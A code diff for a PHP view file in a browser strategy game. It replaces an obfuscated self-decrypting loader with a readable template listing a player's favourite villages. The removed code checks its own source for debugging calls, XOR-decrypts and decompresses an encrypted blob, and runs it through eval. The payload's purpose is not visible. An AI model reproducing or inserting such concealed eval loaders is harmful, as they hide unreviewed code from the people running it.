@@ -1,24 +1,62 @@
 <?php
-$vgkomolnc="4ecc4577ed30eab540c5c020e4ed8d92";
-$zcaneot="0754525b5656555654530209060051540c550054010807555c5600070d5c0e05";
-$dlucofmz="S+ucba8NcVAhiXbzWG1lQHFqviNnvxO7EWBEEjAxImJm1J0f04rM3IOqBZAbej1dOSqzdgFOhv7GwsMzHNLtKfwGAueF+jxeZk6CKP7/BXpIb0BQ13Yy4c+lj6hC2JzxyMPFs9CUfEcvavqWL8YJLP19HgBwDS6YgbsNVU/SemuKgY8vs8m+TOF3vpmeY4Bd9L5Eif5NqKscdrLjy0JleBJ4tM/+9uVN38IIkfPEDaZ87lcwoMHPQ+SJIBcQlqqUokvlvUjpQucY4d+fuVKLtgpNrT/9p4oBDAYVtuJakl2QRtYUfF+cG826pXsz+nWQGPDLpLg5SN8r1DlPZpUFmtiEr9RMmQAmc1UYZAJZiAFNnWr74my75A8w5RrJURZXZcJRxXuCqRT25uNKNvvngi4T2l7QNnDHWXdGazofZBqy9mFUvClzpWfrylo8p4x4y8syCEp4DHlIVHN6q2kfynl6jZiexzg9hoNd5HOXGPDdOPxZJvuAfOC5r8Pp74WJF/jFKADqyNIAT6ZJdeyuqa0rwYAmn2f+iO2XNxEsvS4AOQucqrpFI0OuafFjycHD3PiynqIhto1pEPRbrc7W161qvnSGhhDXAZoIgg2sZcfLiNAYG05RyDHLnQ7h0Arm33WbJ+ZgAeC/yJwHrE9wTNgXLEUjY/ZAn3lvOtCH2XceP+QlrOj4fR++PspBBEnB7jhZ9T8+40GQLItbRiAR+ePSBBuP0RSKMk3NF6MAVcbQZR7Jhzvnn+yxiNQP5RRe4zXTG6huocdvCGZZeGEmeu8yVKZwiuAx77yd4ouEHZgSy2sP6XXfglWaCpQWSRDKXrE+bObVgysO6cvdXch0YNViPaTpG0IUc7uiMaYbwVVGS+kapwOzabrQ99DpwmeGb9jVB6suKth+Z/pgkPW6FVBLy5nfjXvHKDCdqJihY+SBth1VkCriUf5+LjgE4HKgNQJQZzwH5aJiJOoVo5ouIJLh/RGZw9DFZPDo7B2wz1k6DJ1VxlfO9A++n6oF69NPGeM4FfXHTWbUB6lkVB4q73NYlsMgGsR61z4flA==";
-$lvwqgfn=file_get_contents(__FILE__);
-$apropfbm=str_replace($dlucofmz,"",$lvwqgfn);
-if(strpos($apropfbm,"ec"."ho")!==false||strpos($apropfbm,"pr"."int")!==false||strpos($apropfbm,"var_"."dump")!==false||strpos($apropfbm,"file_put_"."contents")!==false||strpos($apropfbm,"fw"."rite")!==false){die();}
-$fxlhrw=str_replace(array($vgkomolnc,$zcaneot),array("SP_3ffa1df0","KP_ccea3f1c"),$lvwqgfn);
-$kyuxvtxb=md5($fxlhrw);
-$npjjvfxao=hex2bin($zcaneot);
-$fvdagbfq="";
-$swesaxar=strlen($kyuxvtxb);
-for($wpijsxyk=0;$wpijsxyk<$swesaxar;$wpijsxyk++){
-$fvdagbfq.=chr(ord($npjjvfxao[$wpijsxyk])^ord($kyuxvtxb[$wpijsxyk]));
-}
-$efrrakr=base64_decode($dlucofmz);
-$dgndbbf=strlen($efrrakr);
-$ihzdzwsmjg="";
-$qkufzdia=strlen($fvdagbfq);
-for($wpijsxyk=0;$wpijsxyk<$dgndbbf;$wpijsxyk++){
-$ihzdzwsmjg.=$efrrakr[$wpijsxyk]^$fvdagbfq[$wpijsxyk%$qkufzdia];
-}
-$nhgoybr="gzun"."compress";
-eval('?>' . $nhgoybr($ihzdzwsmjg) . '<?php ');
+/**
+ * favorite (Favorites) View
+ * Shows user's favorite villages
+ */
+?>
+
+<h2>Favoritos</h2>
+
+<?php if (!empty($error)): ?>
+    <div class="error"><?= htmlspecialchars($error) ?></div>
+<?php endif; ?>
+
+<table class="vis" width="100%">
+    <tr>
+        <th width="60">Ações</th>
+        <th>Aldeia</th>
+    </tr>
+
+    <?php if (empty($favorite)): ?>
+        <tr>
+            <td colspan="3" class="center">Ainda não tem favoritos.</td>
+        </tr>
+    <?php else: ?>
+        <?php foreach ($favorite as $vid => $fav_data): ?>
+            <tr>
+                <td class="center">
+                    <a href="game.php?village=<?= $village['id'] ?>&amp;screen=info_village&amp;id=<?= $vid ?>">
+                        <img src="/graphic/buildings/place.png" title="Informações da aldeia" alt="" />
+                    </a>
+                    <a
+                        href="game.php?village=<?= $village['id'] ?>&amp;screen=map&amp;x=<?= $fav_data['x'] ?>&amp;y=<?= $fav_data['y'] ?>">
+                        <img src="/graphic/map/map.png" title="Centralizar no mapa" alt="" />
+                    </a>
+                    <a href="game.php?village=<?= $village['id'] ?>&amp;screen=favorite&amp;action=del&amp;id=<?= $fav_data['id'] ?>&amp;h=<?= $hkey ?>"
+                        style="color:red;" onclick="return confirm('Deseja remover esta aldeia dos favoritos?');">
+                        <img src="/graphic/icons/delete.png" title="Remover dos favoritos" alt="[X]" />
+                    </a>
+                </td>
+                <td><?= htmlspecialchars($fav_data['name']) ?></td>
+            </tr>
+        <?php endforeach; ?>
+    <?php endif; ?>
+</table>
+
+<br />
+
+<h3>Adicionar aos favoritos</h3>
+<form method="post"
+    action="game.php?village=<?= $village['id'] ?>&amp;screen=favorite&amp;action=add&amp;h=<?= $hkey ?>">
+    <table class="vis" width="100%">
+        <tr>
+            <th>Coordenadas:</th>
+            <td>
+                <input type="text" name="x" size="5" maxlength="3" placeholder="X" />
+                |
+                <input type="text" name="y" size="5" maxlength="3" placeholder="Y" />
+                <input type="submit" value="Adicionar" class="btn" />
+            </td>
+        </tr>
+    </table>
+</form>
